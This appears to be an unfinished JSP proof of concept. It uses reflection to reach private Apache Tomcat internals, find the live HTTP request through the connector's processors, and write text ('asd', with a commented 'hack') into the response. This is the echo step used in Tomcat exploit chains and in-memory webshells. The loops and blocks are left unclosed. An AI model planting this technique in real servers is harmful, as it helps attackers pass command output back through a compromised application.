<%
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();
// out.println((org.apache.cataline.core.ApplicationContext) standardroot.getContext().getServletContext());
java.lang.reflect.Field applicationContextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
applicationContextField.setAccessible(true);
org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) applicationContextField.get(standardroot.getContext());

java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
serviceField.setAccessible(true);
org.apache.catalina.core.StandardService standardService= (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);

org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
for(int i=0;i<connectors.length;i++) {
	if (connectors[i].getScheme().equals("http")) {
		org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
		if (protocolHandler instanceof org.apache.coyote.http11.Http11NioProtocol) {
			java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler");
			getHandlerMethod.setAccessible(true);
			//out.println(getHandlerMethod.invoke(protocolHandler).getClass().getDeclaredMethods()+ "<br>");
			java.lang.reflect.Method getGlobalMethod =  getHandlerMethod.invoke(protocolHandler).getClass().getMethod("getGlobal");
			//org.apache.coyote.RequestGroupInfo global = (org.apache.coyote.RequestGroupInfo) getHandlerMethod.invoke(protocolHandler).getGlobal();
			org.apache.coyote.RequestGroupInfo global = (org.apache.coyote.RequestGroupInfo) getGlobalMethod.invoke(getHandlerMethod.invoke(protocolHandler));
			java.lang.reflect.Field processorsField = global.getClass().getDeclaredField("processors");
			processorsField.setAccessible(true);
			java.util.List processors = (java.util.List) processorsField.get(global);
			for (int p=0;p<processors.size();p++){
				org.apache.coyote.RequestInfo requestinfo = (org.apache.coyote.RequestInfo) processors.get(p);
				//org.apche.coyote.Request tempRequest = (org.apache.coyote.Request) processors.get(p);
				//out.println(requestinfo.getVirtualHost());
				java.lang.reflect.Field temReqField = requestinfo.getClass().getDeclaredField("req");
				temReqField.setAccessible(true);
				org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) temReqField.get(requestinfo);
				//org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) temRequest.getNote(1);
				//org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
				org.apache.catalina.connector.Request req = (org.apache.catalina.connector.Request)tempRequest.getNote(1);
				//java.io.Writer writer = req.getResponse().getWriter();
				//req.getResponse().getWriter().print("hack");
				java.lang.reflect.Field usingWriter = req.getResponse().getClass().getDeclaredField("usingWriter");
				usingWriter.setAccessible(true);
				//usingWriter.set(req.getResponse(), Boolean.FALSE);
				req.getResponse().getWriter().write("asd");
      %>
